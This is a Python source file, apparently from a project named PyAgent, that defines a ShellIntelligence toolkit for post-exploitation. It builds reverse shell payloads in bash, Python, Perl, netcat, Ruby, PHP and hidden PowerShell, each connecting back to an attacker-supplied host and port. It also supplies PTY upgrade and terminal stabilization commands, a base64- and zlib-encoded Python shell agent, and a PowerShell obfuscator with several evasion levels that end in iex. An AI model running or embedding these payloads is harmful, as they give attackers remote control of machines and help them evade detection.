#!/usr/bin/env python3
# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import base64
import zlib
from typing import Dict, List, Optional

class ShellIntelligence:
    """Consolidated shell payloads, upgrade logic, and stabilization techniques."""

    @staticmethod
    def get_reverse_shell_payloads(lhost: str, lport: int) -> Dict[str, str]:
        """Generate common reverse shell payloads."""
        return {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python3": f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\", {lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}};'",
            "nc_traditional": f"nc {lhost} {lport} -e /bin/bash",
            "nc_openbsd": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        }

    @staticmethod
    def get_pty_upgrade_commands() -> List[str]:
        """Commands to upgrade a basic shell to a PTY."""
        return [
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "script -q /dev/null /bin/bash",
            "socat file:`tty`,raw,echo=0 tcp-listen:4444" # Note: listener side
        ]

    @staticmethod
    def get_stty_stabilization() -> List[str]:
        """Sequence for local stty stabilization."""
        return [
            "Ctrl-Z (Background)",
            "stty raw -echo; fg",
            "reset",
            "export TERM=xterm-256color"
        ]

    @staticmethod
    def generate_python_agent_payload(shell: str = "/bin/bash") -> str:
        """
        Generates a compressed, base64-encoded Python agent for shell handling.
        Derived from Penelope's agent logic.
        """
        agent_code = f"""
import os, sys, pty, select, socket
def run():
    shell = "{shell}"
    pid, master_fd = pty.fork()
    if pid == 0:
        os.execl(shell, shell, "-i")
    while True:
        rl, wl, xl = select.select([sys.stdin, master_fd], [], [])
        if sys.stdin in rl:
            d = os.read(sys.stdin.fileno(), 1024)
            os.write(master_fd, d)
        if master_fd in rl:
            d = os.read(master_fd, 1024)
            os.write(sys.stdout.fileno(), d)
run()
"""
        payload = base64.b64encode(zlib.compress(agent_code.encode())).decode()
        return f"python3 -c 'import base64,zlib;exec(zlib.decompress(base64.b64decode(\"{payload}\")))'"

    @staticmethod
    def generate_obfuscated_powershell(script: str, level: int = 2) -> str:
        """
        Generates obfuscated PowerShell code using multiple levels (ported from psobf).
        
        Levels:
        1: Character splitting
        2: Base64 encoding
        3: Gzip compression + Base64
        4: Variable fragmentation
        """
        import base64
        import io
        import gzip
        import random

        encoded = base64.b64encode(script.encode()).decode()
        
        if level == 1:
            # Level 1: Character splitting
            chars = ",".join([f"'`{c}'" for c in script])
            return f"$o = $([char[]]({chars}) -join ''); iex $o"
        
        if level == 2:
            # Level 2: Base64
            return f"$o = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded}')); iex $o"
            
        if level == 3:
            # Level 3: Gzip + Base64
            buf = io.BytesIO()
            with gzip.GzipFile(fileobj=buf, mode='wb') as f:
                f.write(script.encode())
            compressed = base64.b64encode(buf.getvalue()).decode()
            return (f"$c = '{compressed}'; $b = [System.Convert]::FromBase64String($c); "
                    "$s = New-Object IO.MemoryStream(, $b); "
                    "$d = New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress); "
                    "$r = New-Object IO.StreamReader($d); $o = $r.ReadToEnd(); iex $o")

        if level == 4:
            # Level 4: Fragmentation
            parts = [script[i:i+random.randint(2, 5)] for i in range(0, len(script), 5)]
            fragments = ",".join([f"'{p}'" for p in parts])
            return f"$f = @({fragments}); $s = $f -join ''; iex $s"

        return script


